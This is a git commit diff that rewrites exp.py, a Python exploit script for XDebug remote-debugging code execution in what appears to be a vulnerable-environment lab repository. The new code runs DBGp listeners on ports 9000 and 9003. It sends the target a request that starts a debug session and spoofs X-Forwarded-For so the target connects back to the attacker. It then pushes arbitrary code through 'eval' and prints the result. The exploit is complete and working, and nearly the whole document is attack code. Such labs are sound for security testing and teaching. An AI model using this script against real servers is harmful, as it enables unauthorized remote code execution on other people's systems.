e8d715f60b1eaea0a3202d5fbaa7d32d810367f1
Owen Gong <phith0n.ph2f@gmail.com>
2025-03-31 02:44:34 +0800

    improve the xdebug remote debug rce environments (#661)
    * improve the xdebug remote debug rce environments
    
    * improve xdebug debugging rce title
    
    * compress png size

--- php/xdebug-rce/exp.py
+++ php/xdebug-rce/exp.py
@@ -7,16 +7,16 @@ import argparse
 import socket
 import base64
 import binascii
-from concurrent.futures import ThreadPoolExecutor
+import socketserver
+import threading
+import logging
+
+logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(levelname)s - %(message)s')
+server_done = threading.Event()
+server_started = threading.Event()
 
 
-pool = ThreadPoolExecutor(1)
-session = requests.session()
-session.headers = {
-    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
-}
-
-def recv_xml(sock):
+def recv_xml(sock: socket.socket) -> bytes:
     blocks = []
     data = b''
     while True:
@@ -40,41 +40,81 @@ def recv_xml(sock):
     return blocks[3]
 
 
-def trigger(url):
-    time.sleep(2)
+class XDebugRequestHandler(socketserver.BaseRequestHandler):
+    def handle(self):
+        logging.info('[+] Recieve data from %s', self.client_address)
+        self.request.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(self.server.code.encode()), b'\x00']))
+        data = recv_xml(self.request)
+        logging.info('[+] Recieve data: ' + data.decode())
+        g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
+        if not g:
+            logging.warning('[-] No result...')
+            return
+        
+        data = g.group(1)
+        try:
+            logging.info('[+] Result: ' + base64.b64decode(data).decode())
+            server_done.set()
+        except binascii.Error as e:
+            logging.error('[-] May be not string result: %s', e)
+
+
+class XDebugServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
+    def __init__(self, server_address, handler_class, code):
+        self.code = code
+        self.allow_reuse_address = True
+        super().__init__(server_address, handler_class)
+
+    def server_activate(self):
+        super().server_activate()
+        logging.info('[+] Server %s started', self.server_address)
+        server_started.set()
+
+
+def start_dbgp_server(port: int, code: str):
+    server = XDebugServer(('0.0.0.0', port), XDebugRequestHandler, code)
+    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
+    server_thread.start()
+    
+    return server_thread
+
+
+def trigger_debug_session(url: str, attack_ip: str):
     try:
-        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
+        server_started.wait(timeout=5)
+        logging.info('[+] Trigger debug session')
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0'
+        }
+        if attack_ip:
+            headers['X-Forwarded-For'] = attack_ip
+
+        requests.get(url + '?XDEBUG_SESSION_START=phpstorm&XDEBUG_SESSION=1&XDEBUG_TRIGGER=1', headers=headers, timeout=5)
     except:
         pass
 
 
-if __name__ == '__main__':
+def main():
     parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
     parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
     parser.add_argument('-t', '--target', required=True, help='target url.')
-    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')
+    parser.add_argument('--dbgp-ip', default='', help='dbgp server ip address, must can be accessed from target server.')
     args = parser.parse_args()
-    
-    ip_port = ('0.0.0.0', args.listen)
-    sk = socket.socket()
-    sk.settimeout(10)
-    sk.bind(ip_port)
-    sk.listen(5)
 
-    pool.submit(trigger, args.target)
-    conn, addr = sk.accept()
-    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))
-
-    data = recv_xml(conn)
-    print('[+] Recieve data: ' + data.decode())
-    g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
-    if not g:
-        print('[-] No result...')
-        sys.exit(0)
-
-    data = g.group(1)
-
+    start_dbgp_server(9000, args.code)
+    start_dbgp_server(9003, args.code)
+    threading.Thread(target=trigger_debug_session, args=(args.target, args.dbgp_ip), daemon=True).start()
     try:
-        print('[+] Result: ' + base64.b64decode(data).decode())
-    except binascii.Error:
-        print('[-] May be not string result...')
+        # Wait with a timeout, but check for interrupts
+        for i in range(20):
+            if server_done.is_set():
+                break
+            time.sleep(0.5)
+        else:
+            logging.error('[-] Execution timed out')            
+    except KeyboardInterrupt:
+        logging.info('[*] Received keyboard interrupt, exiting...')
+
+
+if __name__ == '__main__':
+    main()
